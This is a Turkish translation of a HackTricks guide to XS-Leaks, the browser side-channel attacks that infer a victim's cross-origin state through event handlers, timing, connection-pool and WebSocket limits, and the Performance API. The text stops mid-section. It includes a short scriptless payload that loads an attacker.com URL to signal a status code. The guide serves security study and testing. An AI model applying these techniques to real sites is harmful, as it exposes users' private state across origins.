# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerini** kullanarak **çapraz köken bilgilerini** **çıkarmak için** kullanılan bir yöntemdir.

Bu saldırıda yer alan ana bileşenler şunlardır:

- **Zayıf Web**: Bilgilerin çıkarılmasının hedeflendiği web sitesi.
- **Saldırganın Webi**: Saldırgan tarafından oluşturulan, kurbanın ziyaret ettiği ve istismarı barındıran kötü niyetli web sitesi.
- **Dahil Etme Yöntemi**: Zayıf Web'in Saldırganın Webi'ne dahil edilmesi için kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
- **Sızıntı Tekniği**: Dahil etme yöntemi aracılığıyla toplanan bilgilere dayanarak Zayıf Web'in durumundaki farklılıkları ayırt etmek için kullanılan teknikler.
- **Durumlar**: Saldırganın ayırt etmeyi hedeflediği Zayıf Web'in iki potansiyel durumu.
- **Tespit Edilebilir Farklılıklar**: Saldırganın Zayıf Web'in durumunu çıkarmak için güvendiği gözlemlenebilir varyasyonlar.

### Tespit Edilebilir Farklılıklar

Zayıf Web'in durumlarını ayırt etmek için analiz edilebilecek birkaç yön vardır:

- **Durum Kodu**: **Çeşitli HTTP yanıt durum kodları** arasında ayırt etme, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi.
- **API Kullanımı**: Sayfalar arasında **Web API'lerinin kullanımını** belirleme, çapraz köken bir sayfanın belirli bir JavaScript Web API'sini kullanıp kullanmadığını ortaya çıkarma.
- **Yönlendirmeler**: Farklı sayfalara yapılan navigasyonları tespit etme, sadece HTTP yönlendirmeleri değil, aynı zamanda JavaScript veya HTML tarafından tetiklenenler.
- **Sayfa İçeriği**: **HTTP yanıt gövdesindeki** veya sayfa alt kaynaklarındaki varyasyonları gözlemleme, örneğin **gömülü çerçevelerin sayısı** veya resimlerdeki boyut farklılıkları.
- **HTTP Başlığı**: **Belirli bir HTTP yanıt başlığının** varlığını veya muhtemel değerini not etme, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıklar dahil.
- **Zamanlama**: İki durum arasındaki tutarlı zaman farklılıklarını fark etme.

### Dahil Etme Yöntemleri

- **HTML Elemanları**: HTML, **çapraz köken kaynak dahil etme** için çeşitli elemanlar sunar, stil sayfaları, resimler veya betikler gibi, tarayıcının HTML dışı bir kaynağı talep etmesini zorunlu kılar. Bu amaçla potansiyel HTML elemanlarının bir derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
- **Çerçeveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Sayfa **çerçeve koruması** eksikse, JavaScript, içerikWindow özelliği aracılığıyla çerçevelenmiş kaynağın pencere nesnesine erişebilir.
- **Açılır Pencereler**: **`window.open`** yöntemi, bir kaynağı yeni bir sekmede veya pencerede açar ve JavaScript'in SOP'ye uygun olarak yöntemler ve özelliklerle etkileşimde bulunması için bir **pencere tutamacı** sağlar. Açılır pencereler, genellikle tek oturum açma işlemlerinde kullanılır, hedef kaynağın çerçeveleme ve çerez kısıtlamalarını aşar. Ancak, modern tarayıcılar açılır pencere oluşturmayı belirli kullanıcı eylemleriyle sınırlamaktadır.
- **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapmaya izin verir. Bu yöntemler, isteği takip etme gibi isteğin üzerinde hassas kontrol sağlar.

### Sızıntı Teknikleri

- **Olay İşleyici**: XS-Leaks'teki klasik bir sızıntı tekniği, **onload** ve **onerror** gibi olay işleyicilerin kaynak yükleme başarısı veya başarısızlığı hakkında bilgi sağlamasıdır.
- **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, ya doğrudan hata mesajından ya da varlığı ve yokluğu arasındaki farkı ayırt ederek sızıntı bilgisi sağlayabilir.
- **Küresel Sınırlar**: Bir tarayıcının fiziksel sınırlamaları, bellek kapasitesi veya diğer zorunlu tarayıcı sınırları gibi, bir eşik aşıldığında sinyal verebilir ve bir sızıntı tekniği olarak hizmet edebilir.
- **Küresel Durum**: Tarayıcıların **küresel durumları** (örneğin, Geçmiş arayüzü) ile tespit edilebilir etkileşimler istismar edilebilir. Örneğin, bir tarayıcının geçmişindeki **giriş sayısı**, çapraz köken sayfalar hakkında ipuçları verebilir.
- **Performans API'si**: Bu API, **mevcut sayfanın performans detaylarını** sağlar, belgenin ve yüklenen kaynakların ağ zamanlamasını içerir, istenen kaynaklar hakkında çıkarımlar yapmayı mümkün kılar.
- **Okunabilir Özellikler**: Bazı HTML özellikleri **çapraz köken okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, JavaScript'in bir web sayfasında çapraz köken olarak dahil edilen çerçeveleri saymasına olanak tanır.

## XSinator Aracı ve Makalesi

XSinator, **birçok bilinen XS-Leaks'e karşı tarayıcıları kontrol etmek için** otomatik bir araçtır ve makalesinde açıklanmıştır: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araca **şu adresten erişebilirsiniz**: [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Hariç Tutulan XS-Leaks**: XSinator'daki diğer sızıntılarla çelişeceği için **hizmet çalışanlarına** dayanan XS-Leaks'leri hariç tutmak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırma ve hatalara dayanan XS-Leaks'leri de **hariç tutmayı** seçtik. Örneğin, CrossOrigin Resource Sharing (CORS) yanlış yapılandırmaları, postMessage sızıntıları veya Cross-Site Scripting. Ayrıca, genellikle yavaş, gürültülü ve hatalı oldukları için zaman tabanlı XS-Leaks'leri de hariç tuttuk.

## **Zaman Tabanlı Teknikler**

Aşağıdaki tekniklerden bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için zaman kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API'si, geliştiricilerin yüksek çözünürlüklü zaman ölçümleri almasına olanak tanır.\
Saldırganların örtük saatler oluşturmak için kötüye kullanabileceği önemli sayıda API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

- **Dahil Etme Yöntemleri**: Çerçeveler, HTML Elemanları
- **Tespit Edilebilir Farklılık**: Durum Kodu
- **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Özet**: Bir kaynağı yüklemeye çalışırken, onerror/onload olayları, kaynağın başarıyla/başarısız bir şekilde yüklenmesi durumunda tetiklenir; durum kodunu belirlemek mümkündür.
- **Kod örneği**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Kod örneği, **JS'den betik nesnelerini yüklemeye** çalışır, ancak **diğer etiketler** (örneğin, nesneler, stil sayfaları, resimler, sesler) de kullanılabilir. Ayrıca, **etiketi doğrudan** enjekte etmek ve `onload` ve `onerror` olaylarını etiketin içinde tanımlamak da mümkündür (JS'den enjekte etmek yerine).

Bu saldırının bir de betiksiz versiyonu vardır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda `example.com/404` bulunamazsa `attacker.com/?error` yüklenecektir.

### Onload Zamanlaması

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API'si**, bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Ancak, 50ms'den fazla süren görevleri tanımlayabilen [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Zamanlaması + Zorunlu Ağır Görev

Bu teknik, bir öncekiyle aynıdır, ancak **saldırgan** ayrıca **cevap olumlu veya olumsuz olduğunda** **ilgili bir süre** alacak bir eylemi **zorlayacaktır** ve o süreyi ölçer.

{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Zamanlaması

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Özet:** [SharedArrayBuffer saati](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers), bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağı almak için geçen süre, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) olaylarını kullanarak ölçülebilir. **`beforeunload`** olayı, tarayıcının yeni bir sayfaya geçmek üzere olduğu zaman tetiklenirken, **`unload`** olayı geçişin gerçekten gerçekleştiği zaman meydana gelir. Bu iki olay arasındaki zaman farkı, **tarayıcının kaynağı almak için harcadığı süreyi** belirlemek için hesaplanabilir.

### Sandboxed Çerçeve Zamanlaması + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API'si, bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) yokluğunda, bir sayfanın ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken zamanın bir saldırgan tarafından ölçülebileceği gözlemlenmiştir. Bu ölçüm genellikle mümkündür çünkü bir iframe'in `onload` işleyicisi, kaynak yüklemesi ve JavaScript yürütmesi tamamlandıktan sonra tetiklenir. Script yürütmesinin getirdiği değişkenliği aşmak için, bir saldırgan `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) niteliğini kullanabilir. Bu niteliğin dahil edilmesi, JavaScript'in yürütülmesi gibi birçok işlevselliği kısıtlar ve böylece ağırlıklı olarak ağ performansından etkilenen bir ölçüm yapılmasını kolaylaştırır.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**:
- **Özet**: Sayfa doğru içerik erişildiğinde hata veriyorsa ve herhangi bir içerik erişildiğinde doğru bir şekilde yükleniyorsa, o zaman tüm bilgileri zaman ölçmeden çıkarmak için bir döngü oluşturabilirsiniz.
- **Kod Örneği**:

Sayfanın **gizli** içeriği **bir Iframe içinde** **eklenebileceğini** varsayalım.

Kurbanın **Iframe** kullanarak "_**flag**_" içeren dosyayı **aramasını** sağlayabilirsiniz (örneğin bir CSRF istismar ederek). Iframe içinde _**onload olayı**_ her zaman **en az bir kez** **çalıştırılacağını** biliyorsunuz. Sonra, **iframe**'in **URL**'sini değiştirerek sadece **hash** içeriğini değiştirebilirsiniz.

Örneğin:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Eğer ilk URL **başarıyla yüklendiyse**, o zaman **URL**'nin **hash** kısmını **değiştirirken** **onload** olayı **tekrar tetiklenmeyecek**. Ama **eğer** sayfa **yüklenirken** bir tür **hata** almışsa, o zaman **onload** olayı **tekrar tetiklenecektir**.

O zaman, erişildiğinde **doğru** yüklenmiş bir sayfa ile **hata** olan bir sayfa arasında **ayrım** yapabilirsiniz.

### Javascript İcra

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**:
- **Özet:** Eğer **sayfa** **hassas** içeriği **dönüyorsa**, **veya** kullanıcı tarafından **kontrol edilebilen** bir **içerik** dönüyorsa. Kullanıcı **geçersiz durumda** **geçerli JS kodu** ayarlayabilir, her denemeyi **`<script>`** etiketleri içinde **yükleyebilir**, böylece **geçersiz** durumlarda saldırganların **kodu** **çalıştırılır**, ve **geçerli** durumlarda **hiçbir şey** çalıştırılmaz.
- **Kod Örneği:**

{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Durum Kodu & Başlıklar
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Özet**: **Cross-Origin Read Blocking (CORB)**, web sayfalarının belirli hassas çapraz kaynaklı kaynakları yüklemesini engelleyen bir güvenlik önlemidir. Ancak, saldırganlar bu koruyucu davranışı istismar edebilir. **CORB**'ye tabi bir yanıt, `nosniff` ile birlikte _**CORB korumalı**_ `Content-Type` ve `2xx` durum kodu dönerse, **CORB** yanıtın gövdesini ve başlıklarını temizler. Bunu gözlemleyen saldırganlar, **durum kodu** (başarı veya hata gösteren) ve `Content-Type` (koruma altında olup olmadığını belirten) kombinasyonunu çıkarabilir, bu da potansiyel bilgi sızıntısına yol açar.
- **Kod Örneği**:

Daha fazla bilgi için daha fazla bilgi bağlantısını kontrol edin.

### onblur

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Özet**: id veya name niteliğinden hassas verileri sızdırın.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir **iframe** içinde **bir sayfa yüklemek** ve sayfanın **belirtilen** ifadesinin **üzerinde odaklanmasını** sağlamak için **`#id_value`** kullanmak mümkündür, ardından bir **`onblur`** sinyali tetiklendiğinde, ID elemanı var demektir.\
Aynı saldırıyı **`portal`** etiketleri ile de gerçekleştirebilirsiniz.

### postMessage Yayınları <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Dahil Etme Yöntemleri**: Frames, Pop-up'lar
- **Tespit Edilebilir Fark**: API Kullanımı
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Özet**: postMessage'dan hassas bilgi toplayın veya postMessages'ın varlığını kullanarak sayfadaki kullanıcının durumunu bilmek için bir oracle olarak kullanın.
- **Kod Örneği**: `Tüm postMessages'ı dinleyen herhangi bir kod.`

Uygulamalar genellikle [`postMessage` yayınlarını](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) farklı kökenler arasında iletişim kurmak için kullanır. Ancak, `targetOrigin` parametresi düzgün bir şekilde belirtilmezse, bu yöntem istemeden **hassas bilgileri** açığa çıkarabilir ve herhangi bir pencerenin mesajları almasına izin verebilir. Ayrıca, bir mesaj almanın kendisi bir **oracle** olarak işlev görebilir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının durumu veya kimliği hakkında bilgi verebilir, örneğin, kimlik doğrulamalarının olup olmadığını.

## Küresel Sınırlar Teknikleri

### WebSocket API

- **Dahil Etme Yöntemleri**: Frames, Pop-up'lar
- **Tespit Edilebilir Fark**: API Kullanımı
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Özet**: WebSocket bağlantı limitini tüketmek, bir çapraz kaynak sayfasının WebSocket bağlantı sayısını sızdırır.
- **Kod Örneği**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Bir hedef sayfanın **kaç tane WebSocket bağlantısı kullandığını** belirlemek mümkündür. Bu, bir saldırganın uygulama durumlarını tespit etmesine ve WebSocket bağlantı sayısına bağlı bilgileri sızdırmasına olanak tanır.

Eğer bir **köken** **maksimum WebSocket** bağlantı nesnelerini kullanıyorsa, bağlantı durumlarından bağımsız olarak, **yeni nesnelerin oluşturulması JavaScript istisnalarına** yol açar. Bu saldırıyı gerçekleştirmek için, saldırgan web sitesi hedef web sitesini bir pop-up veya iframe içinde açar ve ardından hedef web yüklendikten sonra mümkün olan maksimum sayıda WebSocket bağlantısı oluşturmaya çalışır. **Atılan istisnaların sayısı**, hedef web sitesinin kullandığı **WebSocket bağlantı sayısıdır**.

### Ödeme API'si

- **Dahil Etme Yöntemleri**: Frames, Pop-up'lar
- **Tespit Edilebilir Fark**: API Kullanımı
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Özet**: Ödeme Talebini tespit edin çünkü yalnızca bir tane aktif olabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Sızıntı, bir saldırganın **bir çapraz kaynak sayfasının ödeme talebi başlattığını tespit etmesine** olanak tanır.

Çünkü **aynı anda yalnızca bir ödeme talebi aktif olabilir**, eğer hedef web sitesi Ödeme Talebi API'sini kullanıyorsa, bu API'yi kullanma girişimleri **başarısız olacak** ve bir **JavaScript istisnası** oluşturacaktır. Saldırgan, **periyodik olarak Ödeme API'si UI'sını göstermeye çalışarak** bunu istismar edebilir. Eğer bir deneme bir istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, UI oluşturulduktan hemen sonra kapatarak bu periyodik denemeleri gizleyebilir.

### Olay Döngüsünü Zamanlama <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Dahil Etme Yöntemleri**:
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Özet:** Tek iş parçacıklı JS olay döngüsünü kötüye kullanarak bir webin icra süresini ölçün.
- **Kod Örneği**:

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript, [tek iş parçacıklı bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modelinde çalışır, bu da **sadece bir görevi aynı anda gerçekleştirebileceği** anlamına gelir. Bu özellik, **farklı bir kökenden gelen kodun çalıştırılmasının ne kadar sürdüğünü ölçmek için istismar edilebilir**. Bir saldırgan, olay havuzunun boş olduğu zamanlarda sabit özelliklere sahip olayları sürekli olarak göndererek kendi kodunun olay döngüsündeki icra süresini ölçebilir. Eğer diğer kökenler de aynı havuza olay gönderiyorsa, bir **saldırgan, kendi görevlerinin icrasındaki gecikmeleri gözlemleyerek bu dış olayların ne kadar sürdüğünü çıkarabilir**. Olay döngüsündeki gecikmeleri izleme yöntemi, farklı kökenlerden gelen kodun icra süresini açığa çıkarabilir ve potansiyel olarak hassas bilgileri sızdırabilir.

> [!WARNING]
> Bir icra zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce kullanılan kaynakları yükleyerek.

### Meşgul Olay Döngüsü <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Dahil Etme Yöntemleri**:
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Özet:** Bir web işleminin icra süresini ölçmenin bir yöntemi, bir iş parçacığının olay döngüsünü kasıtlı olarak engellemek ve ardından **olay döngüsünün tekrar kullanılabilir hale gelmesi için ne kadar sürdüğünü** zamanlamaktır. Olay döngüsüne bir engelleyici işlem (uzun bir hesaplama veya senkron API çağrısı gibi) ekleyerek ve sonraki kodun icra edilmeye başlaması için geçen süreyi izleyerek, engelleme süresi boyunca olay döngüsünde icra edilen görevlerin süresini çıkarabilirsiniz. Bu teknik, JavaScript'in olay döngüsünün tek iş parçacıklı doğasını kullanır; burada görevler sıralı olarak icra edilir ve aynı iş parçacığını paylaşan diğer işlemlerin performansı veya davranışı hakkında içgörüler sağlayabilir.
- **Kod Örneği**:

Olay döngüsünü kilitleyerek icra süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu aşma potansiyelidir. **Site İzolasyonu**, farklı web sitelerini ayrı süreçlere ayıran bir güvenlik özelliğidir ve kötü niyetli sitelerin diğer sitelerden hassas verilere doğrudan erişimini engellemeyi amaçlar. Ancak, bir saldırgan, paylaşılan olay döngüsü aracılığıyla başka bir kökenin icra zamanlamasını etkileyerek, o kökenin faaliyetleri hakkında dolaylı olarak bilgi çıkarabilir. Bu yöntem, diğer kökenin verilerine doğrudan erişim gerektirmez, aksine o kökenin faaliyetlerinin paylaşılan olay döngüsü üzerindeki etkisini gözlemler, böylece **Site İzolasyonu** tarafından oluşturulan koruyucu engellerden kaçınır.

> [!WARNING]
> Bir icra zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce kullanılan kaynakları yükleyerek.

### Bağlantı Havuzu

- **Dahil Etme Yöntemleri**: JavaScript İstekleri
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Özet:** Bir saldırgan, 1 hariç tüm soketleri kilitleyebilir, hedef web'i yükleyebilir ve aynı anda başka bir sayfayı yükleyebilir, son sayfanın yüklenmeye başlaması için geçen süre, hedef sayfanın yüklenmesi için geçen süredir.
- **Kod Örneği**:

{{#ref}}
connection-pool-example.md
{{#endref}}

Tarayıcılar, sunucu iletişimi için soketler kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, **tarayıcılar eşzamanlı soket sayısına bir sınır koymak zorundadır**. Saldırganlar bu sınırlamayı aşağıdaki adımlarla istismar edebilir:

1. Tarayıcının soket limitini belirleyin, örneğin, 256 global soket.
2. 255 soketi uzun bir süre boyunca, bağlantıları tamamlamadan açık tutacak şekilde, çeşitli hostlara 255 istek başlatarak doldurun.
3. Hedef sayfaya bir istek göndermek için 256. soketi kullanın.
4. Farklı bir hosta 257. bir istek yapmaya çalışın. Tüm soketler kullanıldığından (2. ve 3. adımlara göre), bu istek bir soket mevcut olana kadar bekleyecektir. Bu isteğin ilerlemesi için geçen gecikme, saldırgana 256. soketle (hedef sayfanın soketi) ilgili ağ etkinliği hakkında zaman bilgisi sağlar. Bu çıkarım, 2. adımda kullanılan 255 soketin hala meşgul olması nedeniyle mümkündür; bu, yeni mevcut olan soketin 3. adımda serbest bırakılan soket olması gerektiği anlamına gelir. 256. soketin mevcut hale gelmesi için geçen süre, dolayısıyla hedef sayfaya yapılan isteğin tamamlanması için gereken süreyle doğrudan bağlantılıdır.

Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Hedefe Göre Bağlantı Havuzu

- **Dahil Etme Yöntemleri**: JavaScript İstekleri
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**:
- **Özet:** Önceki teknikle aynı, ancak tüm soketleri kullanmak yerine, Google **Chrome** aynı kökene **6 eşzamanlı istek** sınırı koyar. Eğer **5'ini engellersek** ve ardından **6. bir istek başlatırsak**, bunu **zamanlayabiliriz** ve eğer **kurban sayfasının** aynı uç noktaya daha fazla **istek göndermesini** sağlarsak, **6. istek** **daha uzun** sürecek ve bunu tespit edebiliriz.

## Performans API Teknikleri

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarının performans metrikleri hakkında içgörüler sunar ve [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) ile daha da zenginleştirilmiştir. Resource Timing API, isteklerin süreleri gibi ayrıntılı ağ isteği zamanlamalarını izlemeyi sağlar. Özellikle, sunucular yanıtlarında `Timing-Allow-Origin: *` başlığını içerdiğinde, transfer boyutu ve alan adı arama süresi gibi ek veriler kullanılabilir hale gelir.

Bu veri zenginliği, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla elde edilebilir ve performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak icra sürelerini ölçmeyi kolaylaştırır. Ancak, Chrome gibi bazı tarayıcılarda `performance.now()`'un hassasiyetinin milisaniyelerle sınırlı olabileceği ve bu durumun zamanlama ölçümlerinin ayrıntılığını etkileyebileceği unutulmamalıdır.

Zamanlama ölçümlerinin ötesinde, Performans API'si güvenlikle ilgili içgörüler için de kullanılabilir. Örneğin, Chrome'daki `performance` nesnesindeki sayfaların varlığı veya yokluğu, `X-Frame-Options` uygulandığını gösterebilir. Özellikle, `X-Frame-Options` nedeniyle bir sayfanın bir çerçevede render edilmesi engellenirse, bu sayfa `performance` nesnesinde kaydedilmeyecek ve sayfanın çerçeveleme politikaları hakkında ince bir ipucu sağlayacaktır.

### Hata Sızıntısı

- **Dahil Etme Yöntemleri**: Frames, HTML Elemanları
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Hatalarla sonuçlanan bir istek, bir kaynak zamanlama girişi oluşturmaz.
- **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

HTTP yanıt durum kodları arasında **ayrım yapmak mümkündür** çünkü bir **hata** ile sonuçlanan istekler **performans girişi** oluşturmaz.

### Stil Yenileme Hatası

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Bir tarayıcı hatası nedeniyle, hatalarla sonuçlanan istekler iki kez yüklenir.
- **Kod Örneği**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Önceki teknikte, GC'deki tarayıcı hatalarının, **yüklenemeyen kaynakların iki kez yüklenmesine** yol açtığı iki durum da tespit edilmiştir. Bu, Performans API'sinde birden fazla girişe yol açar ve bu nedenle tespit edilebilir.

### İstek Birleştirme Hatası

- **Dahil Etme Yöntemleri**: HTML Elemanları
